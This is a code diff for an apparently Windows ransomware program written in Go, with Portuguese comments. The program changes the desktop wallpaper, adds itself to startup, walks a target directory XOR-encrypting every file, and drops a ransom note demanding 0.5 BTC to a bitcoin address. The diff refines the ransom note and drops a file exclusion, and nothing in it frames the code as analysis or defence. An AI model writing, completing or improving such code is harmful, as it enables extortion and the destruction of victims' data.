@@ -11,7 +11,7 @@ import (
 	"golang.org/x/sys/windows/registry"
 )
 
-//go:embed wallol.png
+//go:embed wallpaper.png
 var wallpaperData []byte
 
 const (
@@ -27,8 +27,6 @@ var (
 	systemParameters = user32.NewProc("SystemParametersInfoW")
 )
 
-// ======================= FUNÇÕES PRINCIPAIS =======================
-
 func xorEncrypt(data []byte) []byte {
 	encrypted := make([]byte, len(data))
 	for i := range data {
@@ -38,11 +36,15 @@ func xorEncrypt(data []byte) []byte {
 }
 
 func setNewWallpaper() error {
-	wallpaperPath := filepath.Join(targetDir, "wallol.png")
+	tempDir := os.TempDir()
+	wallpaperPath := filepath.Join(tempDir, "wallpaper_temp.jpg")
+
+	// Salvar wallpaper no temp
 	if err := os.WriteFile(wallpaperPath, wallpaperData, 0644); err != nil {
-		return fmt.Errorf("falha ao salvar wallpaper: %v", err)
+		return fmt.Errorf("erro ao salvar wallpaper: %v", err)
 	}
 
+	// Definir wallpaper
 	pathUTF16, err := windows.UTF16PtrFromString(wallpaperPath)
 	if err != nil {
 		return err
@@ -55,8 +57,11 @@ func setNewWallpaper() error {
 		uintptr(spifUpdateIniFile|spifSendWinIniChange),
 	)
 
+	// Remover arquivo temporário
+	os.Remove(wallpaperPath)
+
 	if ret == 0 {
-		return fmt.Errorf("falha ao alterar o wallpaper")
+		return fmt.Errorf("falha ao definir wallpaper")
 	}
 	return nil
 }
@@ -76,21 +81,18 @@ func addToStartup() {
 }
 
 func main() {
-	// Criar pasta
 	os.MkdirAll(targetDir, 0755)
 
-	// Alterar wallpaper
 	if err := setNewWallpaper(); err != nil {
 		fmt.Println("[ERRO]", err)
 		return
 	}
 
-	// Adicionar à inicialização
 	addToStartup()
 
-	// Criptografar arquivos
+	// Criptografar arquivos (ignora diretórios e arquivos do sistema)
 	filepath.Walk(targetDir, func(path string, info os.FileInfo, err error) error {
-		if err != nil || info.IsDir() || filepath.Base(path) == "wallpaper.jpg" {
+		if err != nil || info.IsDir() {
 			return nil
 		}
 
@@ -104,13 +106,11 @@ func main() {
 		return nil
 	})
 
-	// Mensagem de resgate
-	rescueNote := []byte(`  
-███████▄▄███████████▄  
-▓▓▓▓▓▓█░░░░░░░░░░░░░░█  ☠️ SEUS ARQUIVOS FORAM SEQUESTRADOS!  
-▓▓▓▓▓▓█░░░░░░░░░░░░░░█  PAGUE 0.5 BTC EM 48H OU SEUS DADOS SERÃO VAZADOS!  
-`)
+	// Criar arquivo de aviso
+	rescueNote := []byte(`
+☠️ TODOS OS SEUS ARQUIVOS FORAM CRIPTOGRAFADOS! ☠️
+- PAGUE 0.5 BTC PARA: bc1qxy2kgdygjrsqtzq2n0yrf249fgw2q9u4h2d3tg`)
 	os.WriteFile(filepath.Join(targetDir, "!!!WARNING!!!.txt"), rescueNote, 0644)
 
-	fmt.Println("[!] Sistema comprometido. Chave de resgate:", password)
+	fmt.Println("[+] Sistema comprometido. Chave de resgate:", password)
 }
